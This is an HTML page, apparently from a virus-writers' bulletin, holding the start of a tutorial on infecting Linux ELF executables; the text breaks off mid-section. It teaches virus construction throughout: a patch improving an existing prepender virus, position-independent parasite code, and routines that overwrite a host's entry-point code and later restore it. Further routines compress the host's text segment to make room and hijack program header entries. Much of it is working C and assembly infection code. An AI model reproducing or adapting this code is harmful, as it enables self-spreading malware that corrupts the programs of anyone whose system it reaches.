@@ -1,0 +1,2351 @@
+<html>
+<head><title>;)</title><link rel="stylesheet" href="style.css" /></head>
+<body>
+<center><h3>Virus-writing Bulletin</h3><h4>One-oh-one on Linux Virii</h4>-<br><font size=0>. &#9679; glósóli &#9679; .</font></center><br>
+<div id="menu">
+[ <li><a href="1.html">Articles</a></li> ]
+[ <li><a href="2.html">Sources</a></li> ]
+[ <li><a href="3.html">Editorial</a></li> ]
+</div>
+<div id="w1">
+<pre>
+   Version 0.1
+
+   herm1t (x) VxHeavens.com, June 2010
+
+Abstract
+
+   This paper presents the different ELF infection strategies. The primary
+   target is Linux running on IA-32, however most of the code from this
+   tutorial could be adopted for other systems and even other platforms.
+
+   The snippets includes manipulations with segments (padding, shifting
+   text segment down, merging segments, adding and replacing PHT entries,
+   extending data and BSS areas and different cavity infections, such as
+   data, text, header's cavities).
+
+Chapter 1. The Great Prepender
+
+   Most likely all of you familiar with prependers, the simplest form of
+   infection - the virus searches for suitable victims, writes itself to
+   the beginning of the victim, dumps the original file (located after the
+   last byte of the virus) to the temporary file and executes it. This
+   kind of things are known since MS-DOS and could be easily adopted to
+   unices. I will show that even this protozoan viruses could be improved
+   if you're familiar with the ELF structure.
+
+   The common thing with this stuff (like Kaiowas, I-am-sick, Bliss and
+   many many others) that the size of the program is not known at the time
+   of compilation. The virus needs to know its own size to find the start
+   of the original program appended to the virus tail. This is the case
+   when the size is really matters. Usually, it's hardcoded in the source
+   and when you're trying to build the source in the different environment
+   you'll have to compile it twice to get the correct value (or even three
+   times, if the original size was set to zero):
+=== size-ct.c ===
+int main(int argc, char **argv)
+{
+        printf("%d\n", SIZE);
+}
+===
+
+# gcc -s -DSIZE=0 size-ct.c
+# ./a.out
+0
+$ ll ./a.out
+-rwxr-xr-x  1 root root 2908 Apr 29 14:30 ./a.out
+# gcc -s -DSIZE=2908 size-ct.c
+# ./a.out
+2908
+$ ll ./a.out
+-rwxr-xr-x  1 root root 2912 Apr 29 14:30 ./a.out
+$ gcc -s -DSIZE=2912 size-ct.c
+$ ./a.out
+2912
+$ ll ./a.out
+-rwxr-xr-x  1 root root 2912 Apr 29 14:30 ./a.out
+
+   This happened because the compiler optimizes the access to the short
+   constants.
+
+   Knowledge of ELF structure will help one to avoid this mess. I will not
+   include here a vast excerpts from the /usr/include/elf.h, you can look
+   throught it on your localhost. But I need to start somewhere, so the
+   ELF file consist of the header (Elf32_Ehdr) that is always located at
+   offset 0 in the file, the executable file will always have the Program
+   Header  Table  (array of Elf32_Phdr) which describes the loadable
+   segments and one or more segments (blobs) listed in PHT. The Sections
+   Table (array of Elf32_Shdr) is optional and never used neither by
+   kernel nor by dinamic linker. You can use objcopy(1) or sstrip to
+   remove a redundant parts of the executable.
+
+   The segments with type PT_LOAD are mmaped into memory by kernel, the
+   text  segment  usually contains all the headers, so them could be
+   accessed at run-time. To do that we need to determine the process base
+   address. (The program is the file itself, the process is the image of
+   the  program in memory ready to run). The obvious way to find the
+   headers in memory is to use the value defined in SysV ABI - 0x8048000:
+$ readelf -l /bin/ls | grep LOAD
+  LOAD           0x000000 0x08048000 0x08048000 0x150f4 0x150f4 R E 0x1000
+  LOAD           0x0150f4 0x0805e0f4 0x0805e0f4 0x01211 0x01211 RW  0x1000
+
+   To  get  the  size of the virus we will find the loadable segment
+   (phdr[i].p_type == PT_LOAD) with highest offset and add to it the
+   segment size:
+/* get the max offset within loadable segments */
+int elf_max_off(Elf32_Ehdr *ehdr)
+{
+        int i, s, t;
+        /* get the pointer to Program Header Table */
+        Elf32_Phdr *phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
+        for (i = s = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD) {
+                        t = phdr[i].p_offset + phdr[i].p_filesz;
+                        s = t <= s ? : t;
+                }
+        return s;
+}
+
++---------------+
+| EHDR          | \
+| PHT           |  first loadable segment
+| other headers |
+| code ...      | /
++---------------+
+| data          |  second loadable segment
++---------------+  <--- this is the value we are looking for (the real siz
+e of the executable)
+| ...           |  this part of the file will not be loaded to memory
+|               |  here you may find the Section Headers, debug info etc
++---------------+
+
+   I am using the CentOS distro where the prelink is enabled by default
+   and we are in for an unpleasant surprize:
+$ readelf -l /bin/ps | grep LOAD
+  LOAD           0x000000 0x08047000 0x08047000 0x12648 0x12648 R E 0x1000
+  LOAD           0x012648 0x0805a648 0x0805a648 0x00314 0x2068c RW  0x1000
+
+   Some executables has different base address. It's because the prelink
+   extended the code segment by one page to fit additional headers (it
+   does it exactly the same way the viruses does and we discuss this
+   technique in the next chapter), but now we need to find the real base
+   address in run-time.
+
+   Due to mmap(2) constraints, the mmaped region will always began at page
+   boundary, the page size for IA-32 is 4096 bytes, so we could get any
+   address within the program, round it down to the page boundary and
+   check is there ELF magic value at given address, if there is no magic,
+   substract one page until the ELF header is found:
+void *get_base(uint32_t addr) {
+        addr &= ~4095;
+        while (*(uint32_t*)addr != 0x464c457fUL)        // 'E','L','F',0x7
+f
+                addr -= 4096;
+        return (void*)addr;
+}
+
+   So  now  we can patch some dumb virus to use this code instead of
+   predefined values, I choose the I-am-sick and here is the diff:
+We no longer need this:
+-#define MYSIZE   15488       // <- change this
++//#define MYSIZE   15488       // <- change this
++int MYSIZE;
+...
++int elf_max_off(Elf32_Ehdr *ehdr)
+...
++void *get_base(uint32_t addr) {
+...
+Put the initialization to main():
++  MYSIZE = elf_max_off(get_base((uint32_t)main));
+
+   We could optimize this thing even further, it uses argv[0] to open
+   itself and read/write(2) to copy the body of the virus. But since we
+   have  the base address we could copy the virus body directly from
+   memory:
+-  for (x=0;x<MYSIZE;x++)
+-  {
+-   read (me,&buf,1);
+-   write (tmp,&buf,1);
+-  }
++  write(tmp, MYBASE, MYSIZE);
+
+-  MYSIZE = elf_max_off(get_base((uint32_t)main));
++  MYBASE = get_base((uint32_t)main);
++  MYSIZE = elf_max_off(MYBASE);
+
+   There are sleeping dogs. You may add the printf() to print the virus
+   size and it's 3K something bytes long (I used -Os switch to tell gcc to
+   use optimization by size). There are _two_ segments (one for code and
+   once for data) and they must begin at _page boundary_ which is _4K_.
+   There is the catch. The complete executable is 3K long and the process
+   has two pages (one for the code with R-X, and one for data with RW-
+   permissions.
+
+   The same page is mmaped twice, one time for code and second time for
+   data, there are conclusions that follows: the above example will fail
+   if the total size of the virus will grow over the page size, the more
+   interesting, there is a hole in the memory between code and data (the
+   hole is not present in the file) that could be used to keep there virus
+   body. The gap appears due to alignment requirements. And we are ready
+   to left the prependers and move on to manipulations with segments and
+   segment table.
+
+Chapter 2. True parasite
+
+  2.1 Lyrical digression: the virus specific code
+
+   The prepending virus described in the previous chapter is a stand-alone
+   program. It has its own headers, it was tuned both by compilation-time
+   and run-time linkers to operate in the particular memory ranges with
+   the given libc functions. The true virus is not a program, but a piece
+   of code which (typically) cannot afford such dependencies. This means
+   that the code should be crafted in the very special way.
+
+   The following conditions should be satisfied:
+     * One cannot use the global variables, callbacks and strings - the
+       code should be _position-independent_ because in different victims
+       the virus will be located at different addresses:
+        Victim A  Victim B
+8048000 +------+  +------+
+        | Host |  | Host |
+8049000 |      |  +------+
+804a000 +------+  |Virus |
+        |Virus |  +------+
+        +------+
+     * One cannot use library functions - the dynamic linking (loading the
+       libraries and resolving function addresses) is a complex process.
+       The common programs has a lot of tables describing which functions
+       from which library is used and where the resolved addresses whould
+       be stored, while the typical virus has no own headers, even no own
+       data area.
+     * The last condition is gcc-related and insignificant - one should
+       avoid  switch() operator. The large switch statements will be
+       compiled by gcc into jump-table which (again) contains absolute
+       addresses of the branches. There is no switch to supress this kind
+       of optimization, so the switch() must be replaced with a series of
+       if()'s.
+
+   Actually, in the latter part of this tutorial I will show you how to
+   get around this, but here I will focus on less complex topics and show
+   you how to comply with this requirements rather then break the rules.
+
+    2.1.1 System calls
+
+   Since the virus should not use a library functions the all that remains
+   is the system calls. The common way to call the kernel is to use the
+   "int 0x80" instruction. The eax must hold the function number (they all
+   listed  in  the /usr/include/asm/unistd.h) and arguments in other
+   registers:
+#include <asm/unistd.h>
+int main(int argc, char **argv)
+{
+        // write(1, "Hello!\n", 7);
+        char hello[] = {'H', 'e', 'l', 'l', 'o', '!', '\n' };
+        asm ("int $0x80"::"a"(__NR_write),"b"(1),"c"(hello),"d"(7));
+}
+
+or in assembly:
+
+; exit(0)
+        mov     eax, 1
+        mov     ebx, 2
+        int     0x80
+
+   There are also exceptions to this convention:
+; socket(PF_INET, SOCK_STREAM, 0)
+        mov     eax, 102        ; __NR_socketcall
+        mov     ebx, 1          ; SYS_SOCKET
+        push    0               ; protocol
+        push    SOCK_STREAM     ; type
+        push    PF_INET         ; domain
+        mov     ecx, esp
+        int     0x80
+
+; mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS, 0, 0);
+        push    0               ; offset
+        push    0               ; fd
+        push    0x20            ; flags
+        push    0x03            ; prot
+        push    0x1000          ; length
+        push    0               ; start
+        mov     eax, 90
+        mov     ebx, esp
+        int     0x80
+
+   We could define the generic syscall as following:
+asm(    "_syscall:\n"
+        "       pusha\n"
+        "       mov     36(%esp),%eax\n"
+        "       mov     40(%esp),%ebx\n"
+        "       mov     44(%esp),%ecx\n"
+        "       mov     48(%esp),%edx\n"
+        "       mov     52(%esp),%esi\n"
+        "       mov     56(%esp),%edi\n"
+        "       mov     60(%esp),%ebp\n"
+        "       int     $0x80\n"
+        "       mov     %eax,28(%esp)\n"
+        "       popa\n"
+        "       ret\n");
+extern unsigned int _syscall();
+#define write(a,b,c)            _syscall(4,  a,b,c)
+...
+
+    2.1.2 Virtual Dynamic Shared Object
+
+   From the 2.6 series of kernels there is the option to use "sysenter"
+   instead  of "int 0x80". The feature could be enabled by sysctl -w
+   kernel.vdso=1 If VDSO is available, then the special library appears in
+   the process address space which contains syscall() function. To obtain
+   the address of the VDSO syscall you need to parse aux-vector (array of
+   Elf32_auxv_t located after environment variables):
+        | 0 0 0 0 | guarding zero
+        | filename| real filename, one should use this, not argv[0]
+        |    :    |
+        | auxv[0] |
+        |    :    |
+        |    :    |
+        | envp[0] | environment
+        |    :    |
+        |    :    |
+        | argv[0] | command args
+        |  argc   | <- ESP (Stack)
+        V         V
+        ...........
+        ^         ^
+        |  BSS    | uninitialized vars and heap
+        +---------+
+        |  DATA   |
+        +---------+
+        |  CODE   |
+        +---------+
+        :         :
+        :         :
+/* examples/sysenter.c */
+#include <elf.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <asm/unistd.h>
+
+typedef int __attribute__((regparm(1))) (*syscall0_t) (int);
+
+int main(int argc, char **argv, char **envp)
+{
+        Elf32_auxv_t *aux;
+        int i;
+        syscall0_t syscall0 = NULL;
+        uint32_t *old_syscall;
+
+        if ((old_syscall = (uint32_t*)malloc(4 + 4096 - 1)) == NULL)
+                return 1;
+        old_syscall = (uint32_t*)(((uint32_t)old_syscall + 4095) & ~(4095)
+);
+        *old_syscall = 0x90c380cd;
+        if (mprotect(old_syscall, 4, PROT_READ|PROT_EXEC))
+                return 1;
+
+        for (i=0; envp[i]; ++i)
+                ;
+        for (aux = (Elf32_auxv_t*)(envp + i + 1); aux->a_type; ++aux)
+                if (aux->a_type == AT_SYSINFO) {
+                        syscall0 = (void*)aux->a_un.a_val;
+                        break;
+                }
+        if (syscall0 == NULL) {
+                printf("AT_SYSINFO not present\n");
+                syscall0 = (void*)old_syscall;
+        }
+        printf("PID is %d\n", syscall0(__NR_getpid));
+}
+
+   If VDSO is not available the above program would allocate properly
+   aligned chunk of memory and store there the function which will invoke
+   "int 0x80" and return the control to the main program. The regparm
+   attribute is required to force the program to pass the function args
+   through registers instead of stack. Since regparm cannot be larger than
+   3, the real syscall routine will require some trickery.
+
+    2.1.3 Size and base address again
+
+   In  the  first chapter I showed how to determine the process base
+   address, but now we need to find the base of the code snippet located
+   at the random position in memory. The classical approach is to use the
+   "call" instruction:
+virus_start:
+        ...
+        call    1f                              # the address of "1" goes 
+to stack
+1:      pop     %ebp                            # load it into ebp
+        sub     $(1b - virus_start), %ebp       # find the base
+
+   Bad news - the CALL will be defined with inline assembly, the rest
+   could be coded in C:
+asm(".globl main; main: call _main; ret");
+int _main(int argc)
+{
+        uint32_t addr = *(uint32_t*)(&argc - 1) - 5;
+
+   or
+asm(".globl main; main: call _main; ret");
+int _main(void)
+{
+        uint32_t addr = (uint32_t)__builtin_return_address(0) - 5;
+
+   With some versions of gcc the -fno-unit-at-a-time switch is required to
+   supress  block  reordering  (because  the  call must be the first
+   instruction of the virus). After all, the "virus base" code could be
+   written completely in assembly:
+asm(    ".globl main; main:\n"
+        "call 1f\n"
+        "1: sub $(1b-main), (%esp)\n"
+        "call _main\n"
+        "popl %eax\n"
+        "ret");
+void _main(int addr) {
+...
+
+   To determine the size of the code snippet I will put it between two
+   labels (the label here is not a C label, the labels of required type
+   could be defined either by assembly or by dummy functions):
+void end(void);
+extern start;
+asm("start:");
+int main(int argc, char **argv)
+{
+        int size = (uint32_t)&end - (uint32_t)&start;
+        printf("The size of main() function is %d bytes\n", size);
+}
+void end(){}
+
+   This will produce the following code:
+08048370 <main>:
+ 8048370:     b8 8b 83 04 08            mov    $0x804838b,%eax          # 
+end
+ 8048375:     2d 70 83 04 08            sub    $0x8048370,%eax          # 
+start
+ 804837a:     89 44 24 08               mov    %eax,0x8(%esp)           # 
+size
+ 804837e:     c7 44 24 04 60 84 04      movl   $0x8048460,0x4(%esp)     # 
+"The size..."
+ 8048385:     08
+ 8048386:     e9 25 ff ff ff            jmp    80482b0 <printf@plt>
+
+0804838b <end>:
+ 804838b:     c3                        ret
+
+   Not so good, eh? The original addresses is still here. As always,
+   assembly would allow to make it more optimal:
+asm("start:");
+int main(int argc, char **argv)
+{
+        int size;
+        asm("movl $(end - start), %0" : "=r"(size));
+        printf("The size of main() function is %d bytes\n", size);
+}
+asm("end:");
+
+    2.1.4 Global variables and constants
+
+   This  restriction  is  due to the inability to deal with absolute
+   addressing in "mobile" code. Let's see into the code of the simplest
+   "Hello":
+080482a0 <puts@plt>:
+ 80482a0:       ff 25 4c 95 04 08       jmp    *0x804954c
+ 80482a6:       68 00 00 00 00          push   $0x0
+ 80482ab:       e9 e0 ff ff ff          jmp    8048290 <_init+0x18>
+
+ 8048370:       55                      push   %ebp
+ 8048371:       89 e5                   mov    %esp,%ebp
+ 8048373:       68 54 84 04 08          push   $0x8048454
+ 8048378:       e8 23 ff ff ff          call   80482a0 <puts@plt>
+ 804837d:       c9                      leave
+ 804837e:       c3                      ret
+
+   The offset in the call instruction (0xffffff23) would be added to the
+   current  address  (0x804837d)  and the resulting address would be
+   0x80482a0. Such addresses are called _relative_. The address of the
+   argument to puts() (0x804844) does not depend on the address of the
+   instruction which uses it, it is _absolute_ address. The virus doesn't
+   knew (avoided to know) from which address in memory its code would
+   begin in the victim, so any attempts to use absolute addresses will
+   lead to crash.
+
+   The virus might fix all absolute references within its code, but this
+   requires either the table with the list of all places where absolute
+   addresses must be fixed (such table in the regular programs is called
+   _relocation_ table, it is absent in the majority of executables and
+   might be keeped by passing -Wl,-emit-relocs switch to the compiler), or
+   a disassembler which would be able to disassemble the virus, analyze
+   all the references and fix them. Don't you think that it's a bit too
+   complex?
+int a;
+int main(int argc, char **argv)
+{
+        printf("%d\n", a);
+        return 0;
+}
+
+08048370 <main>:
+ 8048370:       ff 35 68 95 04 08       pushl  0x8049568        # a variab
+le
+ 8048376:       68 5c 84 04 08          push   $0x804845c       # string "
+%d\n"
+ 804837b:       e8 30 ff ff ff          call   80482b0 <printf@plt>
+ 8048380:       58                      pop    %eax
+ 8048381:       5a                      pop    %edx
+ 8048382:       31 c0                   xor    %eax,%eax
+ 8048384:       c3                      ret
+
+   If we try to load this program at different address the segmentation
+   fault will be unavoidable, because there would be unmapped pages at the
+   addresses presented in the code. The crash would happen even earlier
+   than program interpreter (/lib/ld-linux.so) would try to load libc and
+   resolve the addresses of the external functions.
+
+   An reasonable alternative for the global variables and string constants
+   is  the gcc extension - global register variables and initialized
+   arrays:
+#include <stdint.h>
+typedef struct {
+        int a;
+} global_vars;
+register global_vars *globals asm("ebp");
+
+void foo(void)
+{
+        char fmt[4] = {'%', 'd', '\n', 0 };
+        printf(fmt, globals->a);
+        *(uint32_t*)fmt = 0x000a7825;   /* "%x\n" */
+        printf(fmt, globals->a);
+}
+
+int main(int argc, char **argv)
+{
+        global_vars g;
+        globals = &g;
+        globals->a = 99;
+        foo();
+        return 0;
+}
+
+08048370 <foo>:
+ 8048370:       53                      push   %ebx
+ 8048371:       50                      push   %eax
+ 8048372:       c7 04 24 25 64 0a 00    movl   $0xa6425,(%esp)          # 
+a)
+ 8048379:       ff 75 00                pushl  0x0(%ebp)                # 
+globals->a
+ 804837c:       8d 5c 24 04             lea    0x4(%esp),%ebx
+ 8048380:       53                      push   %ebx
+ 8048381:       e8 2a ff ff ff          call   80482b0 <printf@plt>
+ 8048386:       c7 44 24 08 25 78 0a    movl   $0xa7825,0x8(%esp)       # 
+b)
+ 804838d:       00
+ 804838e:       ff 75 00                pushl  0x0(%ebp)                # 
+globals->a
+ 8048391:       53                      push   %ebx
+ 8048392:       e8 19 ff ff ff          call   80482b0 <printf@plt>
+ 8048397:       83 c4 14                add    $0x14,%esp
+ 804839a:       5b                      pop    %ebx
+ 804839b:       c3                      ret
+
+0804839c <main>:
+ 804839c:       51                      push   %ecx
+ 804839d:       89 e5                   mov    %esp,%ebp                # 
+globals = &g
+ 804839f:       c7 04 24 63 00 00 00    movl   $0x63,(%esp)             $ 
+g.a = 99
+ 80483a6:       e8 c5 ff ff ff          call   8048370 <foo>
+ 80483ab:       31 c0                   xor    %eax,%eax
+ 80483ad:       5a                      pop    %edx
+ 80483ae:       c3                      ret
+
+   The space for the g structure is allocated in the stack and all the
+   references are relative to the ebp register.
+
+   In this example both assigments produce the same code, but case b) is
+   pref'd, because with large arrays there are chance that gcc will copy
+   the array's content to the .rodata section and will emit the memcpy
+   from .rodata to local variable.
+
+    2.1.5 Functions addresses, offsets and delta-offsets
+
+   The next trivial example of callback:
+int bar(void)
+{
+        return 1;
+}
+int foo(int (*f)(void))
+{
+        return f();
+}
+main()
+{
+        return foo(bar);
+}
+
+   Produce the following code:
+0804833c <bar>:
+ 804833c:       b8 01 00 00 00          mov    $0x1,%eax
+ 8048341:       c3                      ret
+
+08048342 <foo>:
+ 8048342:       ff 54 24 04             call   *0x4(%esp)
+ 8048346:       c3                      ret
+
+08048347 <main>:
+ 8048347:       68 3c 83 04 08          push   $0x804833c       # abs. add
+r. of bar
+ 804834c:       e8 f1 ff ff ff          call   8048342 <foo>
+ 8048351:       5a                      pop    %edx
+ 8048352:       c3                      ret
+
+   But it is possible to calculate the addresses of functions at run-time
+   using their offsets (from the beginning of the virus) or delta-offsets:
+/* examples/fooptr1.c */
+#include <stdio.h>
+#include <stdint.h>
+
+extern main();
+asm(".globl main; main: call _main; ret");
+
+int foo(void)
+{
+        return 99;
+}
+
+void _main(void)
+{
+        uint32_t addr = (uint32_t)__builtin_return_address(0) - 5;
+        int (*foo_ptr)(void) = (int(*)(void))(addr + (foo - main));
+        printf("%d\n", foo_ptr());
+}
+/* examples/fooptr2.c */
+#include <stdio.h>
+#include <stdint.h>
+
+extern void main(void);
+asm(".globl main; main: call _main; ret");
+
+int foo(void)
+{
+        return 99;
+}
+
+void _main(void)
+{
+        uint32_t delta = (uint32_t)main - ((uint32_t)__builtin_return_addr
+ess(0) - 5);
+        int (*foo_ptr)(void) = (int(*)(void))((uint32_t)foo + delta);
+        printf("%d %d\n", delta, foo_ptr());
+}
+      the addresses in the                but in the infected file
+      first gen. of virus                 virus will occupy
+      were tuned by the                   the different addresses
+      linker
+        :              :                    :              :
+8048000 |              |            8048000 |              |
+        |              |                    |              |
+8048370 |main:         |---   ---   8048370 |- - - - - - - |
+        |              | X     ^            |              | virus "thinki
+ng"
+8048376 |foo:          |---    |    8048376 |              | that its body
+        |              |       |            |              | is here
+        | _main:       |       |            |              |
+        |              |       | D          |              |
+        |              |       |            |- - - - - - - |
+        :              :       |            :              :
+                               v            :              :
+X = 8048376 - 8048370 = 6     ---   8049000 | main:        | but actually 
+it's here
+D = 8048370 - 8049000 = -3216               |              |
+                                    8049006 | foo          |
+                                            |              |
+                                            | _main        |
+
+   X  is  the  offset  of foo() function from main() label, D is the
+   delta-offset  of  the  virus  (the difference between old and new
+   addresses). In the code references to foo() may look like "call [ebx +
+   6]" (ebx contains the base address of virus), or like "call [8048376 +
+   ebx]   (delta   in   ebx).  The  results  are  nearly  the  same.
+   Position-independent code generated by the compiler uses the first
+   trick, but all offsets are calculated from the .got.plt section.
+
+    2.1.6 Framework. Sort of.
+
+   I will use a few macros and functions to minimize the code of the
+   examples. It includes recursive search() routine (very similar to the
+   function from Tannenbaum's MOS book) and common parts of the infect()
+   routine which will open file for read/write, mmap it and check the
+   headers.
+
+   At last, we have all parts of the future parasite!
+
+  2.2 Moving the host to overlay
+
+   This is somehow similar to the prepending infection. I will copy the
+   virus_size bytes from the entry point of the program to the tail of the
+   file and write the virus body on its place. When the virus will inish
+   its work it will move itself to the newly allocated memory and will
+   read the host's original bytes where it were.
+BEFORE                                     AFTER
++--------------+                       +--------------+
+|.ELF          | text segment          |.ELF          |
+|              |                       |              |
+|   HOST       | <--  entry point  --> |VIRUS| ..ST   |
+|              |                       |              |
++--------------+                       +--------------+
+|              | data segment          |              |
+|              |                       |              |
+|              |                       |              |
+|              |                       |              |
++--------------+                       +--------------+
+:              : non-loadable          :              :
+:              :                       :              :
+:              :                       :              :
++- - - - - - - +                       +- - - - - - - +
+                                       : HO...:
+                                       +------+
+
+   The virus must:
+     * Determine the size of its code and location in memory, save it to
+       global variable
+     * Find the suitable victim
+     * Check that there is enough space in the code segment between entry
+       point and the end of segment
+     * Move the frgament of the host code (equal in size to the virus)
+       from the entry point to the end of file
+     * Write its own code to the entry point
+     * Find another victim
+     * Allocate the memory and move its code there
+     * "Free" the text segment of itself
+     * Read the host code (from the file's tail) to the text segment
+     * Pass the control to the entry point
+
+/* 1) find text segment */
+        Elf32_Phdr *text_seg;
+        phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+        for (text_seg = NULL, i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
+                        text_seg = &phdr[i];
+                        break;
+                }
+        if (text_seg == NULL)
+                goto _unmap;
+/* 2) check is there enough space between entry point and end of segment *
+/
+        if ((text_seg->p_vaddr + text_seg->p_filesz - ehdr->e_entry) < 409
+6)
+                goto _unmap;
+/* 3) move part of the .text from the entry point to the end of file */
+        char *p = m + ehdr->e_entry - text_seg->p_vaddr;
+        if (write(h, p, g->size) != g->size)
+                goto _unmap;
+/* 4) write virus body */
+        memcpy(p, g->self, g->size);
+
+   Easy, right? But when the infected progam will be executed and the
+   virus will infect eveything that moves, it need to restore the original
+   program. To do this the virus will:
+/* 1) Allocate the memory for the copy of itself */
+        uint32_t nloc;
+        nloc = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON
+YMOUS, 0, 0);
+        if (nloc > 0xfffff000)
+                exit(0);
+/* 2) Copy its body there */
+        memcpy((void*)nloc, (void*)self, size);
+/* 3) Jump to the newly allocated memory */
+        mprotect(nloc, size, PROT_READ|PROT_EXEC);
+#ifdef CJMP
+        void __attribute__((noinline,stdcall)) jmp(uint32_t addr) {
+                *(volatile unsigned int*)(&addr - 1) = addr;
+        }
+        if (nloc == 0xdeadbeef)
+                goto L;
+#warning "You're using CJMP"
+        jmp(nloc + ((uint32_t)&&L - (uint32_t)&virus_start));
+L:
+#else
+        asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r
+"(nloc):"%eax");
+#endif
+/* 4) Change memory permissions of freed memory to RW */
+        mprotect((void*)((uint32_t)self & 0xfffff000), 8192, PROT_READ|PRO
+T_WRITE);
+/* 5) Read the original bytes there */
+        unsigned int selfexe[4];
+        /* "/proc/self/exe" */
+        selfexe[0] = 0x6f72702f;
+        selfexe[1] = 0x65732f63;
+        selfexe[2] = 0x652f666c;
+        selfexe[3] = 0x00006578;
+        int h = open(selfexe, 0);
+        lseek(h, -size, 2);
+        read(h, self, size);
+        read(h, 0, 0);
+        close(h);
+
+/* 6) Change permissions to RX */
+
+        mprotect((void*)((uint32_t)self & 0xfffff000), 8192, PROT_READ|PRO
+T_EXEC);
+
+/* 7) Proceed to the entry point */
+        /* this line is located between 2) and 3) */
+        *(uint32_t*)(nloc + 10) = (uint32_t)self - (uint32_t)nloc - 14;
+        ...
+        *(uint32_t*)(&esp - 1) = (nloc + 7);
+
+   The memory is allocated by mmap() with MAP_ANONYMOUS flag, the complex
+   part is jumps coded in C. To free the memory virus need to jump to
+   newly allocated area:
+      Steps 1-4                         Steps 5-7
+        :   :                             :   :
+        | V | memory allocated by mmap    | V |
+        | I |                             | I |
+        | R |<---+                        | R |
+        | U |    |                        | U |
+        | S |    |                    +---| S |
+        :   :    |                    |   :   :
+        :   :    |                    |   :   :
+        +---+ text segment            |   +---+
+        |   |    |                    |   |   |
+        |   |    |                    |   |   |
+        | V |<------ Entry point      +-->| H |
+        | I |    |                        | O |
+        | R | ---+                        | S |
+        | U |                             | T |
+        | S |                             |   |
+
+   The complete code of this virus is in the "Mover" directory.
+
+  2.3 Compressing the text segment
+
+   let's  find the place for the host code somewhere within segment.
+   Compress the code from the entry point:
++--------------+              +--------------+
+|              |              |              |
+| code code co |< --- EP --- >| VIRUS | comp |
+| de code code |              | ressed seg.  |
+| rodata ...   |              | 0 0 0 0 0 0  |
+|              |              |  0 0 0 0 0 0 |
++--------------+              +--------------+
+
+   The code will be quite similar to the previous section, the virus will
+     * Find the text segment
+     * Calculate the size of the area between entry point and the end of
+       segment (size)
+     * Allocate "size" bytes of memory with brk() system call
+     * Attempt to compress the host's code (using arithmetic encoding)
+     * Check is there enough space for the virus body and compressed host
+       code.
+     * Copy virus and encoded host's code to the entry point
+
+/* examples/Compressor/infect-compr.c */
+        for (i = 0; i < ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
+                        char tmp[3374];
+                        uint32_t vo = ehdr->e_entry - phdr[i].p_vaddr;
+                        uint32_t csize, size = phdr[i].p_filesz - vo;
+                        char *ctext = (void*)brk(0);
+                        brk(ctext + size);
+                        mprotect(ctext, size, PROT_READ|PROT_WRITE);
+                        if ((csize = ari_compress(m + vo, ctext, size, tmp
+)) == 0)
+                                goto error;
+                        if (size < csize + g->size+ 4)
+                                goto error;
+                        uint8_t *p = (uint32_t*)(m + vo);
+                        bzero(p, size);
+
+                        memcpy(p, g->self, g->size);
+                        p += g->size;
+                        memcpy(p, &size, 4);
+                        p += 4;
+                        memcpy(p, ctext, csize);
+                        /* entry point left unchanged */
+                        break;
+error:                  /* free memory */
+                        bzero(ctext, size);
+                        brk(ctext);
+                        goto _unmap;
+                }
+
+   When the virus will finish its work it is neccessary to unpack the
+   compressed host's code:
+/* examples/Compressor/restore.c */
+        /* move itself to the new memory location */
+        uint32_t text_size = *(uint32_t*)(g->self + g->size);
+        uint32_t nloc;
+        nloc = mmap(NULL, text_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP
+_ANONYMOUS, 0, 0);
+        if (nloc > 0xfffff000)
+                exit(0);
+        memcpy((void*)nloc, g->self, text_size);
+        *(uint32_t*)(nloc + 8) -= nloc - (uint32_t)g->self;
+        mprotect(nloc, text_size, PROT_READ|PROT_EXEC);
+        asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r
+"(nloc):"%eax");
+
+        /* restore victim */
+        char tmp[3374];
+        text_size = (text_size + 4095) & 0xfffff000;
+        mprotect((uint32_t)g->self & 0xfffff000, text_size, PROT_READ|PROT
+_WRITE);
+        ari_expand((void*)(nloc + g->size + 4), g->self, tmp);
+        mprotect((uint32_t)g->self & 0xfffff000, text_size, PROT_READ|PROT
+_EXEC);
+        /* adjust return address */
+        *(uint32_t*)(&esp - 1) = (nloc + 6);
+
+Segments
+
+  Replacing unused PHT entries
+
+   It's nearly impossible to change the segment address, but may be we
+   could add another segment? What should we do? Not too much: write the
+   virus code somewhere in the file and add the entry to the Program
+   Headers Table describing new segment. But again it's hard to increase
+   the table size because the table itself is located in the text segment.
+   Let's take a closer look to the table:
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+  LOAD           0x000000 0x08048000 0x08048000 0x13b5a 0x13b5a R E 0x1000
+  LOAD           0x014000 0x0805c000 0x0805c000 0x00820 0x00bd0 RW  0x1000
+  DYNAMIC        0x014440 0x0805c440 0x0805c440 0x000e0 0x000e0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x0134f8 0x0805b4f8 0x0805b4f8 0x0002c 0x0002c R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+
+   The neccessary records are of type PT_LOAD (this is the program's code
+   and data), PT_INTERP (path to the dynamic linker), PT_DYNAMIC (linker's
+   data). The rest (with some restrictions) could be replaced.
+     * PT_NOTE rarely used. Might be erased without any doubts.
+     * PT_PHDR Could be removed if the PHT is located within loadable
+       segment (usually it is).
+     * PT_GNU_STACK Could be erased if the program doesn't require the
+       executable stack ((p_flags & PF_X) == 0)
+     * PT_GNU_EH_FRAME
+
+   How to fill the structure for the new segment?
